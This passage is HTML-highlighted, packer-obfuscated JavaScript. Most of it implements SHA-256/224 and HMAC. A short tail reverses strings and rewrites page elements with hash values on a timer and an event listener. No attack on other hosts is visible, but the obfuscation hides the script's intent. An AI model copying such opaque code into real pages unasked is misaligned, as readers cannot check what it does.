class="hljs-number">4</span>s&#125;k.<span class="hljs-number">1</span>C=k.<span class="hljs-number">1</span>A=k.L=k.<span class="hljs-number">2</span>i=<span class="hljs-number">0</span>;k.<span class="hljs-number">1</span>U=k.<span class="hljs-number">1</span>L=<span class="hljs-number">1</span>O;k.<span class="hljs-number">2</span>j=<span class="hljs-number">1</span>d;k.x=x&#125;N.Q.S=w(s)&#123;p(k.<span class="hljs-number">1</span>U)&#123;A&#125;q\x202h,T=<span class="hljs-number">1</span>c\x20s;p(T!==\x272p\x27)&#123;p(T===\x271n\x27)&#123;p(s===<span class="hljs-number">2</span>q)&#123;<span class="hljs-number">1</span>u\x20O\x201t(<span class="hljs-number">1</span>l)&#125;z\x20p(<span class="hljs-number">1</span>y&amp;&amp;s.<span class="hljs-number">1</span>J===Z)&#123;s=O\x202r(s)&#125;z\x20p(!<span class="hljs-number">1</span>z.<span class="hljs-number">1</span>K(s))&#123;p(!<span class="hljs-number">1</span>y||!Z.<span class="hljs-number">1</span>N(s))&#123;<span class="hljs-number">1</span>u\x20O\x201t(<span class="hljs-number">1</span>l)&#125;&#125;&#125;z&#123;<span class="hljs-number">1</span>u\x20O\x201t(<span class="hljs-number">1</span>l)&#125;<span class="hljs-number">2</span>h=<span class="hljs-number">1</span>d&#125;q\x20r,M=<span class="hljs-number">0</span>,i,W=s.W,l=k.l;<span class="hljs-number">4</span>t(M&lt;W)&#123;p(k.<span class="hljs-number">1</span>L)&#123;k.<span class="hljs-number">1</span>L=<span class="hljs-number">1</span>O;l[<span class="hljs-number">0</span>]=k.<span class="hljs-number">1</span>C;l[<span class="hljs-number">16</span>]=l[<span class="hljs-number">1</span>]=l[<span class="hljs-number">2</span>]=l[<span class="hljs-number">3</span>]=l[<span class="hljs-number">4</span>]=l[<span class="hljs-number">5</span>]=l[<span class="hljs-number">6</span>]=l[<span class="hljs-number">7</span>]=l[<span class="hljs-number">8</span>]=l[<span class="hljs-number">9</span>]=l[<span class="hljs-number">10</span>]=l[<span class="hljs-number">11</span>]=l[<span class="hljs-number">12</span>]=l[<span class="hljs-number">13</span>]=l[<span class="hljs-number">14</span>]=l[<span class="hljs-number">15</span>]=<span class="hljs-number">0</span>&#125;p(<span class="hljs-number">2</span>h)&#123;<span class="hljs-number">1</span>g(i=k.<span class="hljs-number">1</span>A;M&lt;W&amp;&amp;i&lt;<span class="hljs-number">1</span>k;++M)&#123;l[i&gt;&gt;<span class="hljs-number">2</span>]|=s[M]&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>]&#125;&#125;z&#123;<span class="hljs-number">1</span>g(i=k.<span class="hljs-number">1</span>A;M&lt;W&amp;&amp;i&lt;<span class="hljs-number">1</span>k;++M)&#123;r=s.<span class="hljs-number">1</span>Q(M);p(r&lt;R)&#123;l[i&gt;&gt;<span class="hljs-number">2</span>]|=r&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>]&#125;z\x20p(r&lt;<span class="hljs-number">2</span>v)&#123;l[i&gt;&gt;<span class="hljs-number">2</span>]|=(<span class="hljs-number">2</span>t|(r&gt;&gt;<span class="hljs-number">6</span>))&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>];l[i&gt;&gt;<span class="hljs-number">2</span>]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>]&#125;z\x20p(r&lt;<span class="hljs-number">2</span>A||r&gt;=<span class="hljs-number">2</span>E)&#123;l[i&gt;&gt;<span class="hljs-number">2</span>]|=(<span class="hljs-number">2</span>D|(r&gt;&gt;<span class="hljs-number">12</span>))&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>];l[i&gt;&gt;<span class="hljs-number">2</span>]|=(R|((r&gt;&gt;<span class="hljs-number">6</span>)&amp;V))&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>];l[i&gt;&gt;<span class="hljs-number">2</span>]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>]&#125;z&#123;r=<span class="hljs-number">2</span>C+(((r&amp;<span class="hljs-number">23</span>)&lt;&lt;<span class="hljs-number">10</span>)|(s.<span class="hljs-number">1</span>Q(++M)&amp;<span class="hljs-number">23</span>));l[i&gt;&gt;<span class="hljs-number">2</span>]|=(<span class="hljs-number">2</span>X|(r&gt;&gt;<span class="hljs-number">18</span>))&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>];l[i&gt;&gt;<span class="hljs-number">2</span>]|=(R|((r&gt;&gt;<span class="hljs-number">12</span>)&amp;V))&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>];l[i&gt;&gt;<span class="hljs-number">2</span>]|=(R|((r&gt;&gt;<span class="hljs-number">6</span>)&amp;V))&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>];l[i&gt;&gt;<span class="hljs-number">2</span>]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;<span class="hljs-number">3</span>]&#125;&#125;&#125;k.<span class="hljs-number">2</span>u=i;k.L+=i-k.<span class="hljs-number">1</span>A;p(i&gt;=<span class="hljs-number">1</span>k)&#123;k.<span class="hljs-number">1</span>C=l[<span class="hljs-number">16</span>];k.<span class="hljs-number">1</span>A=i-<span class="hljs-number">1</span>k;k.<span class="hljs-number">1</span>W();k.<span class="hljs-number">1</span>L=<span class="hljs-number">1</span>d&#125;z&#123;k.<span class="hljs-number">1</span>A=i&#125;&#125;p(k.L&gt;<span class="hljs-number">4</span>r)&#123;k.<span class="hljs-number">2</span>i+=k.L/<span class="hljs-number">2</span>H&lt;&lt;<span class="hljs-number">0</span>;k.L=k.L%<span class="hljs-number">2</span>H&#125;A\x20k&#125;;N.Q.<span class="hljs-number">1</span>s=w()&#123;p(k.<span class="hljs-number">1</span>U)&#123;A&#125;k.<span class="hljs-number">1</span>U=<span class="hljs-number">1</span>d;q\x20l=k.l,i=k.<span class="hljs-number">2</span>u;l[<span class="hljs-number">16</span>]=k.<span class="hljs-number">1</span>C;l[i&gt;&gt;<span class="hljs-number">2</span>]|=<span class="hljs-number">2</span>w[i&amp;<span class="hljs-number">3</span>];k.<span class="hljs-number">1</span>C=l[<span class="hljs-number">16</span>];p(i&gt;=<span class="hljs-number">4</span>q)&#123;p(!k.<span class="hljs-number">1</span>L)&#123;k.<span class="hljs-number">1</span>W()&#125;l[<span class="hljs-number">0</span>]=k.<span class="hljs-number">1</span>C;l[<span class="hljs-number">16</span>]=l[<span class="hljs-number">1</span>]=l[<span class="hljs-number">2</span>]=l[<span class="hljs-number">3</span>]=l[<span class="hljs-number">4</span>]=l[<span class="hljs-number">5</span>]=l[<span class="hljs-number">6</span>]=l[<span class="hljs-number">7</span>]=l[<span class="hljs-number">8</span>]=l[<span class="hljs-number">9</span>]=l[<span class="hljs-number">10</span>]=l[<span class="hljs-number">11</span>]=l[<span class="hljs-number">12</span>]=l[<span class="hljs-number">13</span>]=l[<span class="hljs-number">14</span>]=l[<span class="hljs-number">15</span>]=<span class="hljs-number">0</span>&#125;l[<span class="hljs-number">14</span>]=k.<span class="hljs-number">2</span>i&lt;&lt;<span class="hljs-number">3</span>|k.L&gt;&gt;&gt;<span class="hljs-number">29</span>;l[<span class="hljs-number">15</span>]=k.L&lt;&lt;<span class="hljs-number">3</span>;k.<span class="hljs-number">1</span>W()&#125;;N.Q.<span class="hljs-number">1</span>W=w()&#123;q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,<span class="hljs-number">1</span>a,<span class="hljs-number">1</span>b,<span class="hljs-number">1</span>j,v,<span class="hljs-number">1</span>f,<span class="hljs-number">1</span>h,<span class="hljs-number">1</span>B,<span class="hljs-number">1</span>Z,<span class="hljs-number">1</span>V,<span class="hljs-number">1</span>D;<span class="hljs-number">1</span>g(j=<span class="hljs-number">16</span>;j&lt;<span class="hljs-number">1</span>k;++j)&#123;v=l[j-<span class="hljs-number">15</span>];<span class="hljs-number">1</span>a=((v&gt;&gt;&gt;<span class="hljs-number">7</span>)|(v&lt;&lt;<span class="hljs-number">25</span>))^((v&gt;&gt;&gt;<span class="hljs-number">18</span>)|(v&lt;&lt;<span class="hljs-number">14</span>))^(v&gt;&gt;&gt;<span class="hljs-number">3</span>);v=l[j-<span class="hljs-number">2</span>];<span class="hljs-number">1</span>b=((v&gt;&gt;&gt;<span class="hljs-number">17</span>)|(v&lt;&lt;<span class="hljs-number">15</span>))^((v&gt;&gt;&gt;<span class="hljs-number">19</span>)|(v&lt;&lt;<span class="hljs-number">13</span>))^(v&gt;&gt;&gt;<span class="hljs-number">10</span>);l[j]=l[j-<span class="hljs-number">16</span>]+<span class="hljs-number">1</span>a+l[j-<span class="hljs-number">7</span>]+<span class="hljs-number">1</span>b&lt;&lt;<span class="hljs-number">0</span>&#125;<span class="hljs-number">1</span>D=b&amp;c;<span class="hljs-number">1</span>g(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">1</span>k;j+=<span class="hljs-number">4</span>)&#123;p(k.<span class="hljs-number">2</span>j)&#123;p(k.x)&#123;<span class="hljs-number">1</span>B=<span class="hljs-number">4</span>m;v=l[<span class="hljs-number">0</span>]-<span class="hljs-number">4</span>n;h=v-<span class="hljs-number">4</span>o&lt;&lt;<span class="hljs-number">0</span>;d=v+<span class="hljs-number">4</span>p&lt;&lt;<span class="hljs-number">0</span>&#125;z&#123;<span class="hljs-number">1</span>B=<span class="hljs-number">4</span>v;v=l[<span class="hljs-number">0</span>]-<span class="hljs-number">4</span>w;h=v-<span class="hljs-number">4</span>G&lt;&lt;<span class="hljs-number">0</span>;d=v+<span class="hljs-number">4</span>D&lt;&lt;<span class="hljs-number">0</span>&#125;k.<span class="hljs-number">2</span>j=<span class="hljs-number">1</span>O&#125;z&#123;<span class="hljs-number">1</span>a=((a&gt;&gt;&gt;<span class="hljs-number">2</span>)|(a&lt;&lt;<span class="hljs-number">30</span>))^((a&gt;&gt;&gt;<span class="hljs-number">13</span>)|(a&lt;&lt;<span class="hljs-number">19</span>))^((a&gt;&gt;&gt;<span class="hljs-number">22</span>)|(a&lt;&lt;<span class="hljs-number">10</span>));<span class="hljs-number">1</span>b=((e&gt;&gt;&gt;<span class="hljs-number">6</span>)|(e&lt;&lt;<span class="hljs-number">26</span>))^((e&gt;&gt;&gt;<span class="hljs-number">11</span>)|(e&lt;&lt;<span class="hljs-number">21</span>))^((e&gt;&gt;&gt;<span class="hljs-number">25</span>)|(e&lt;&lt;<span class="hljs-number">7</span>));<span class="hljs-number">1</span>B=a&amp;b;<span class="hljs-number">1</span>j=<span class="hljs-number">1</span>B^(a&amp;c)^<span class="hljs-number">1</span>D;<span class="hljs-number">1</span>h=(e&amp;f)^(~e&amp;g);v=h+<span class="hljs-number">1</span>b+<span class="hljs-number">1</span>h+K[j]+l[j];<span class="hljs-number">1</span>f=<span class="hljs-number">1</span>a+<span class="hljs-number">1</span>j;h=d+v&lt;&lt;<span class="hljs-number">0</span>;d=v+<span class="hljs-number">1</span>f&lt;&lt;<span class="hljs-number">0</span>&#125;<span class="hljs-number">1</span>a=((d&gt;&gt;&gt;<span class="hljs-number">2</span>)|(d&lt;&lt;<span class="hljs-number">30</span>))^((d&gt;&gt;&gt;<span class="hljs-number">13</span>)|(d&lt;&lt;<span class="hljs-number">19</span>))^((d&gt;&gt;&gt;<span class="hljs-number">22</span>)|(d&lt;&lt;<span class="hljs-number">10</span>));<span class="hljs-number">1</span>b=((h&gt;&gt;&gt;<span class="hljs-number">6</span>)|(h&lt;&lt;<span class="hljs-number">26</span>))^((h&gt;&gt;&gt;<span class="hljs-number">11</span>)|(h&lt;&lt;<span class="hljs-number">21</span>))^((h&gt;&gt;&gt;<span class="hljs-number">25</span>)|(h&lt;&lt;<span class="hljs-number">7</span>));<span class="hljs-number">1</span>Z=d&amp;a;<span class="hljs-number">1</span>j=<span class="hljs-number">1</span>Z^(d&amp;b)^<span class="hljs-number">1</span>B;<span class="hljs-number">1</span>h=(h&amp;e)^(~h&amp;f);v=g+<span class="hljs-number">1</span>b+<span class="hljs-number">1</span>h+K[j+<span class="hljs-number">1</span>]+l[j+<span class="hljs-number">1</span>];<span class="hljs-number">1</span>f=<span class="hljs-number">1</span>a+<span class="hljs-number">1</span>j;g=c+v&lt;&lt;<span class="hljs-number">0</span>;c=v+<span class="hljs-number">1</span>f&lt;&lt;<span class="hljs-number">0</span>;<span class="hljs-number">1</span>a=((c&gt;&gt;&gt;<span class="hljs-number">2</span>)|(c&lt;&lt;<span class="hljs-number">30</span>))^((c&gt;&gt;&gt;<span class="hljs-number">13</span>)|(c&lt;&lt;<span class="hljs-number">19</span>))^((c&gt;&gt;&gt;<span class="hljs-number">22</span>)|(c&lt;&lt;<span class="hljs-number">10</span>));<span class="hljs-number">1</span>b=((g&gt;&gt;&gt;<span class="hljs-number">6</span>)|(g&lt;&lt;<span class="hljs-number">26</span>))^((g&gt;&gt;&gt;<span class="hljs-number">11</span>)|(g&lt;&lt;<span class="hljs-number">21</span>))^((g&gt;&gt;&gt;<span class="hljs-number">25</span>)|(g&lt;&lt;<span class="hljs-number">7</span>));<span class="hljs-number">1</span>V=c&amp;d;<span class="hljs-number">1</span>j=<span class="hljs-number">1</span>V^(c&amp;a)^<span class="hljs-number">1</span>Z;<span class="hljs-number">1</span>h=(g&amp;h)^(~g&amp;e);v=f+<span class="hljs-number">1</span>b+<span class="hljs-number">1</span>h+K[j+<span class="hljs-number">2</span>]+l[j+<span class="hljs-number">2</span>];<span class="hljs-number">1</span>f=<span class="hljs-number">1</span>a+<span class="hljs-number">1</span>j;f=b+v&lt;&lt;<span class="hljs-number">0</span>;b=v+<span class="hljs-number">1</span>f&lt;&lt;<span class="hljs-number">0</span>;<span class="hljs-number">1</span>a=((b&gt;&gt;&gt;<span class="hljs-number">2</span>)|(b&lt;&lt;<span class="hljs-number">30</span>))^((b&gt;&gt;&gt;<span class="hljs-number">13</span>)|(b&lt;&lt;<span class="hljs-number">19</span>))^((b&gt;&gt;&gt;<span class="hljs-number">22</span>)|(b&lt;&lt;<span class="hljs-number">10</span>));<span class="hljs-number">1</span>b=((f&gt;&gt;&gt;<span class="hljs-number">6</span>)|(f&lt;&lt;<span class="hljs-number">26</span>))^((f&gt;&gt;&gt;<span class="hljs-number">11</span>)|(f&lt;&lt;<span class="hljs-number">21</span>))^((f&gt;&gt;&gt;<span class="hljs-number">25</span>)|(f&lt;&lt;<span class="hljs-number">7</span>));<span class="hljs-number">1</span>D=b&amp;c;<span class="hljs-number">1</span>j=<span class="hljs-number">1</span>D^(b&amp;d)^<span class="hljs-number">1</span>V;<span class="hljs-number">1</span>h=(f&amp;g)^(~f&amp;h);v=e+<span class="hljs-number">1</span>b+<span class="hljs-number">1</span>h+K[j+<span class="hljs-number">3</span>]+l[j+<span class="hljs-number">3</span>];<span class="hljs-number">1</span>f=<span class="hljs-number">1</span>a+<span class="hljs-number">1</span>j;e=a+v&lt;&lt;<span class="hljs-number">0</span>;a=v+<span class="hljs-number">1</span>f&lt;&lt;<span class="hljs-number">0</span>&#125;k.C=k.C+a&lt;&lt;<span class="hljs-number">0</span>;k.B=k.B+b&lt;&lt;<span class="hljs-number">0</span>;k.E=k.E+c&lt;&lt;<span class="hljs-number">0</span>;k.F=k.F+d&lt;&lt;<span class="hljs-number">0</span>;k.J=k.J+e&lt;&lt;<span class="hljs-number">0</span>;k.I=k.I+f&lt;&lt;<span class="hljs-number">0</span>;k.H=k.H+g&lt;&lt;<span class="hljs-number">0</span>;k.D=k.D+h&lt;&lt;<span class="hljs-number">0</span>&#125;;N.Q.<span class="hljs-number">1</span>e=w()&#123;k.<span class="hljs-number">1</span>s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C&gt;&gt;<span class="hljs-number">28</span>)&amp;o]+m[(C&gt;&gt;<span class="hljs-number">24</span>)&amp;o]+m[(C&gt;&gt;<span class="hljs-number">20</span>)&amp;o]+m[(C&gt;&gt;<span class="hljs-number">16</span>)&amp;o]+m[(C&gt;&gt;<span class="hljs-number">12</span>)&amp;o]+m[(C&gt;&gt;<span class="hljs-number">8</span>)&amp;o]+m[(C&gt;&gt;<span class="hljs-number">4</span>)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;<span class="hljs-number">28</span>)&amp;o]+m[(B&gt;&gt;<span class="hljs-number">24</span>)&amp;o]+m[(B&gt;&gt;<span class="hljs-number">20</span>)&amp;o]+m[(B&gt;&gt;<span class="hljs-number">16</span>)&amp;o]+m[(B&gt;&gt;<span class="hljs-number">12</span>)&amp;o]+m[(B&gt;&gt;<span class="hljs-number">8</span>)&amp;o]+m[(B&gt;&gt;<span class="hljs-number">4</span>)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;<span class="hljs-number">28</span>)&amp;o]+m[(E&gt;&gt;<span class="hljs-number">24</span>)&amp;o]+m[(E&gt;&gt;<span class="hljs-number">20</span>)&amp;o]+m[(E&gt;&gt;<span class="hljs-number">16</span>)&amp;o]+m[(E&gt;&gt;<span class="hljs-number">12</span>)&amp;o]+m[(E&gt;&gt;<span class="hljs-number">8</span>)&amp;o]+m[(E&gt;&gt;<span class="hljs-number">4</span>)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;<span class="hljs-number">28</span>)&amp;o]+m[(F&gt;&gt;<span class="hljs-number">24</span>)&amp;o]+m[(F&gt;&gt;<span class="hljs-number">20</span>)&amp;o]+m[(F&gt;&gt;<span class="hljs-number">16</span>)&amp;o]+m[(F&gt;&gt;<span class="hljs-number">12</span>)&amp;o]+m[(F&gt;&gt;<span class="hljs-number">8</span>)&amp;o]+m[(F&gt;&gt;<span class="hljs-number">4</span>)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;<span class="hljs-number">28</span>)&amp;o]+m[(J&gt;&gt;<span class="hljs-number">24</span>)&amp;o]+m[(J&gt;&gt;<span class="hljs-number">20</span>)&amp;o]+m[(J&gt;&gt;<span class="hljs-number">16</span>)&amp;o]+m[(J&gt;&gt;<span class="hljs-number">12</span>)&amp;o]+m[(J&gt;&gt;<span class="hljs-number">8</span>)&amp;o]+m[(J&gt;&gt;<span class="hljs-number">4</span>)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;<span class="hljs-number">28</span>)&amp;o]+m[(I&gt;&gt;<span class="hljs-number">24</span>)&amp;o]+m[(I&gt;&gt;<span class="hljs-number">20</span>)&amp;o]+m[(I&gt;&gt;<span class="hljs-number">16</span>)&amp;o]+m[(I&gt;&gt;<span class="hljs-number">12</span>)&amp;o]+m[(I&gt;&gt;<span class="hljs-number">8</span>)&amp;o]+m[(I&gt;&gt;<span class="hljs-number">4</span>)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;<span class="hljs-number">28</span>)&amp;o]+m[(H&gt;&gt;<span class="hljs-number">24</span>)&amp;o]+m[(H&gt;&gt;<span class="hljs-number">20</span>)&amp;o]+m[(H&gt;&gt;<span class="hljs-number">16</span>)&amp;o]+m[(H&gt;&gt;<span class="hljs-number">12</span>)&amp;o]+m[(H&gt;&gt;<span class="hljs-number">8</span>)&amp;o]+m[(H&gt;&gt;<span class="hljs-number">4</span>)&amp;o]+m[H&amp;o];p(!k.x)&#123;<span class="hljs-number">1</span>e+=m[(D&gt;&gt;<span class="hljs-number">28</span>)&amp;o]+m[(D&gt;&gt;<span class="hljs-number">24</span>)&amp;o]+m[(D&gt;&gt;<span class="hljs-number">20</span>)&amp;o]+m[(D&gt;&gt;<span class="hljs-number">16</span>)&amp;o]+m[(D&gt;&gt;<span class="hljs-number">12</span>)&amp;o]+m[(D&gt;&gt;<span class="hljs-number">8</span>)&amp;o]+m[(D&gt;&gt;<span class="hljs-number">4</span>)&amp;o]+m[D&amp;o]&#125;A\x201e&#125;;N.Q.<span class="hljs-number">2</span>U=N.Q.<span class="hljs-number">1</span>e;N.Q.<span class="hljs-number">1</span>G=w()&#123;k.<span class="hljs-number">1</span>s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C&gt;&gt;<span class="hljs-number">24</span>)&amp;u,(C&gt;&gt;<span class="hljs-number">16</span>)&amp;u,(C&gt;&gt;<span class="hljs-number">8</span>)&amp;u,C&amp;u,(B&gt;&gt;<span class="hljs-number">24</span>)&amp;u,(B&gt;&gt;<span class="hljs-number">16</span>)&amp;u,(B&gt;&gt;<span class="hljs-number">8</span>)&amp;u,B&amp;u,(E&gt;&gt;<span class="hljs-number">24</span>)&amp;u,(E&gt;&gt;<span class="hljs-number">16</span>)&amp;u,(E&gt;&gt;<span class="hljs-number">8</span>)&amp;u,E&amp;u,(F&gt;&gt;<span class="hljs-number">24</span>)&amp;u,(F&gt;&gt;<span class="hljs-number">16</span>)&amp;u,(F&gt;&gt;<span class="hljs-number">8</span>)&amp;u,F&amp;u,(J&gt;&gt;<span class="hljs-number">24</span>)&amp;u,(J&gt;&gt;<span class="hljs-number">16</span>)&amp;u,(J&gt;&gt;<span class="hljs-number">8</span>)&amp;u,J&amp;u,(I&gt;&gt;<span class="hljs-number">24</span>)&amp;u,(I&gt;&gt;<span class="hljs-number">16</span>)&amp;u,(I&gt;&gt;<span class="hljs-number">8</span>)&amp;u,I&amp;u,(H&gt;&gt;<span class="hljs-number">24</span>)&amp;u,(H&gt;&gt;<span class="hljs-number">16</span>)&amp;u,(H&gt;&gt;<span class="hljs-number">8</span>)&amp;u,H&amp;u];p(!k.x)&#123;<span class="hljs-number">2</span>b.<span class="hljs-number">4</span>A((D&gt;&gt;<span class="hljs-number">24</span>)&amp;u,(D&gt;&gt;<span class="hljs-number">16</span>)&amp;u,(D&gt;&gt;<span class="hljs-number">8</span>)&amp;u,D&amp;u)&#125;A\x202b&#125;;N.Q.<span class="hljs-number">27</span>=N.Q.<span class="hljs-number">1</span>G;N.Q.<span class="hljs-number">2</span>R=w()&#123;k.<span class="hljs-number">1</span>s();q\x201w=O\x20Z(k.x?<span class="hljs-number">28</span>:<span class="hljs-number">32</span>);q\x201i=O\x204x(<span class="hljs-number">1</span>w);<span class="hljs-number">1</span>i.<span class="hljs-number">1</span>p(<span class="hljs-number">0</span>,k.C);<span class="hljs-number">1</span>i.<span class="hljs-number">1</span>p(<span class="hljs-number">4</span>,k.B);<span class="hljs-number">1</span>i.<span class="hljs-number">1</span>p(<span class="hljs-number">8</span>,k.E);<span class="hljs-number">1</span>i.<span class="hljs-number">1</span>p(<span class="hljs-number">12</span>,k.F);<span class="hljs-number">1</span>i.<span class="hljs-number">1</span>p(<span class="hljs-number">16</span>,k.J);<span class="hljs-number">1</span>i.<span class="hljs-number">1</span>p(<span class="hljs-number">20</span>,k.I);<span class="hljs-number">1</span>i.<span class="hljs-number">1</span>p(<span class="hljs-number">24</span>,k.H);p(!k.x)&#123;<span class="hljs-number">1</span>i.<span class="hljs-number">1</span>p(<span class="hljs-number">28</span>,k.D)&#125;A\x201w&#125;;w\x201P(G,x,<span class="hljs-number">1</span>v)&#123;q\x20i,T=<span class="hljs-number">1</span>c\x20G;p(T===\x272p\x27)&#123;q\x20L=[],W=G.W,M=<span class="hljs-number">0</span>,r;<span class="hljs-number">1</span>g(i=<span class="hljs-number">0</span>;i&lt;W;++i)&#123;r=G.<span class="hljs-number">1</span>Q(i);p(r&lt;R)&#123;L[M++]=r&#125;z\x20p(r&lt;<span class="hljs-number">2</span>v)&#123;L[M++]=(<span class="hljs-number">2</span>t|(r&gt;&gt;<span class="hljs-number">6</span>));L[M++]=(R|(r&amp;V))&#125;z\x20p(r&lt;<span class="hljs-number">2</span>A||r&gt;=<span class="hljs-number">2</span>E)&#123;L[M++]=(<span class="hljs-number">2</span>D|(r&gt;&gt;<span class="hljs-number">12</span>));L[M++]=(R|((r&gt;&gt;<span class="hljs-number">6</span>)&amp;V));L[M++]=(R|(r&amp;V))&#125;z&#123;r=<span class="hljs-number">2</span>C+(((r&amp;<span class="hljs-number">23</span>)&lt;&lt;<span class="hljs-number">10</span>)|(G.<span class="hljs-number">1</span>Q(++i)&amp;<span class="hljs-number">23</span>));L[M++]=(<span class="hljs-number">2</span>X|(r&gt;&gt;<span class="hljs-number">18</span>));L[M++]=(R|((r&gt;&gt;<span class="hljs-number">12</span>)&amp;V));L[M++]=(R|((r&gt;&gt;<span class="hljs-number">6</span>)&amp;V));L[M++]=(R|(r&amp;V))&#125;&#125;G=L&#125;z&#123;p(T===\x271n\x27)&#123;p(G===<span class="hljs-number">2</span>q)&#123;<span class="hljs-number">1</span>u\x20O\x201t(<span class="hljs-number">1</span>l)&#125;z\x20p(<span class="hljs-number">1</span>y&amp;&amp;G.<span class="hljs-number">1</span>J===Z)&#123;G=O\x202r(G)&#125;z\x20p(!<span class="hljs-number">1</span>z.<span class="hljs-number">1</span>K(G))&#123;p(!<span class="hljs-number">1</span>y||!Z.<span class="hljs-number">1</span>N(G))&#123;<span class="hljs-number">1</span>u\x20O\x201t(<span class="hljs-number">1</span>l)&#125;&#125;&#125;z&#123;<span class="hljs-number">1</span>u\x20O\x201t(<span class="hljs-number">1</span>l)&#125;&#125;p(G.W&gt;<span class="hljs-number">1</span>k)&#123;G=(O\x20N(x,<span class="hljs-number">1</span>d)).S(G).<span class="hljs-number">27</span>()&#125;q\x201F=[],<span class="hljs-number">2</span>e=[];<span class="hljs-number">1</span>g(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1</span>k;++i)&#123;q\x20b=G[i]||<span class="hljs-number">0</span>;<span class="hljs-number">1</span>F[i]=<span class="hljs-number">4</span>z^b;<span class="hljs-number">2</span>e[i]=<span class="hljs-number">4</span>y^b&#125;N.<span class="hljs-number">1</span>I(k,x,<span class="hljs-number">1</span>v);k.S(<span class="hljs-number">2</span>e);k.<span class="hljs-number">1</span>F=<span class="hljs-number">1</span>F;k.<span class="hljs-number">2</span>c=<span class="hljs-number">1</span>d;k.<span class="hljs-number">1</span>v=<span class="hljs-number">1</span>v&#125;<span class="hljs-number">1</span>P.Q=O\x20N();<span class="hljs-number">1</span>P.Q.<span class="hljs-number">1</span>s=w()&#123;N.Q.<span class="hljs-number">1</span>s.<span class="hljs-number">1</span>I(k);p(k.<span class="hljs-number">2</span>c)&#123;k.<span class="hljs-number">2</span>c=<span class="hljs-number">1</span>O;q\x202W=k.<span class="hljs-number">27</span>();N.<span class="hljs-number">1</span>I(k,k.x,k.<span class="hljs-number">1</span>v);k.S(k.<span class="hljs-number">1</span>F);k.S(<span class="hljs-number">2</span>W);N.Q.<span class="hljs-number">1</span>s.<span class="hljs-number">1</span>I(k)&#125;&#125;;q\x20X=<span class="hljs-number">2</span>a();X.<span class="hljs-number">1</span>q=X;X.<span class="hljs-number">1</span>H=<span class="hljs-number">2</span>a(<span class="hljs-number">1</span>d);X.<span class="hljs-number">1</span>q.<span class="hljs-number">2</span>V=<span class="hljs-number">2</span>f();X.<span class="hljs-number">1</span>H.<span class="hljs-number">2</span>V=<span class="hljs-number">2</span>f(<span class="hljs-number">1</span>d);p(<span class="hljs-number">2</span>G)&#123;<span class="hljs-number">2</span>g.X=X&#125;z&#123;Y.<span class="hljs-number">1</span>q=X.<span class="hljs-number">1</span>q;Y.<span class="hljs-number">1</span>H=X.<span class="hljs-number">1</span>H;p(<span class="hljs-number">2</span>s)&#123;<span class="hljs-number">2</span>l(w()&#123;A\x20X&#125;)&#125;&#125;&#125;)();w\x202y(e)&#123;<span class="hljs-number">1</span>g(q\x20t=\x22\x22,n=e.W-<span class="hljs-number">1</span>;n&gt;=<span class="hljs-number">0</span>;n--)t+=e[n];A\x20t&#125;w\x202J(t,y=\x224B\x22)&#123;<span class="hljs-number">1</span>m.<span class="hljs-number">1</span>o(\x221M\x22).<span class="hljs-number">1</span>r=<span class="hljs-number">1</span>q(<span class="hljs-number">1</span>m.<span class="hljs-number">1</span>o(\x221M\x22).<span class="hljs-number">1</span>r+y)&#125;w\x202B(e=\x224E\x22)&#123;<span class="hljs-number">1</span>m.<span class="hljs-number">1</span>o(\x221M\x22).<span class="hljs-number">1</span>r=<span class="hljs-number">1</span>q(e+<span class="hljs-number">1</span>m.<span class="hljs-number">1</span>o(\x221M\x22).<span class="hljs-number">1</span>r)&#125;w\x202K(a,b)&#123;<span class="hljs-number">1</span>m.<span class="hljs-number">1</span>o(\x221M\x22).<span class="hljs-number">1</span>r=<span class="hljs-number">2</span>y(<span class="hljs-number">1</span>m.<span class="hljs-number">1</span>o(\x222F\x22).<span class="hljs-number">1</span>r)&#125;<span class="hljs-number">1</span>m.<span class="hljs-number">1</span>o(\x222F\x22).<span class="hljs-number">1</span>r=\x22\x22;<span class="hljs-number">4</span>u(w()&#123;<span class="hljs-number">2</span>B(\x224M\x22)&#125;,<span class="hljs-number">4</span>N);<span class="hljs-number">1</span>m.<span class="hljs-number">1</span>o(\x224P\x22).<span class="hljs-number">4</span>Q(\x224R\x22,<span class="hljs-number">2</span>J);<span class="hljs-number">2</span>K(\x223O\x22,<span class="hljs-number">44</span>);&#x27;,&#x27;||||||||||||||||||||this|blocks|HEX_CHARS||<span class="hljs-number">0</span>x0F|if|var|code|message||<span class="hljs-number">0</span>xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|<span class="hljs-number">0</span>x80|update|type|SHIFT|<span class="hljs-number">0</span>x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|<span 